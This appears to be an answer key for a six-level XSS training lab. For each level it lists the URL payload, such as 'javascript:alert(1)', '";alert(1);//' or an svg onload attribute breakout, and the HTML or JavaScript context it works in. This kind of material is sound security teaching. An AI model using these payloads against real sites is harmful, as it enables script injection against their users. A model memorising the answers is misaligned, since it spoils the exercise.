# redirectxss — solutions

Reflections into URL-valued attributes (href, meta refresh, form action, object data, JS window.location).

### redirectxss-level1

`/redirectxss/level1/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: `<a href="...">`; javascript: protocol

### redirectxss-level2

`/redirectxss/level2/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: `<meta http-equiv="refresh" content="0;url=...">`

### redirectxss-level3

`/redirectxss/level3/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: `<form action="...">`; needs form submit; alt: `"><svg onload=alert(1)>`

### redirectxss-level4

`/redirectxss/level4/?query=%22;alert(1);//`

- payload: `";alert(1);//`
- context: inside JS string `window.location="..."`; break out

### redirectxss-level5

`/redirectxss/level5/?query=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: inside `<a href="/redirect?url=...">`; attribute breakout

### redirectxss-level6

`/redirectxss/level6/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: `<object data="...">`
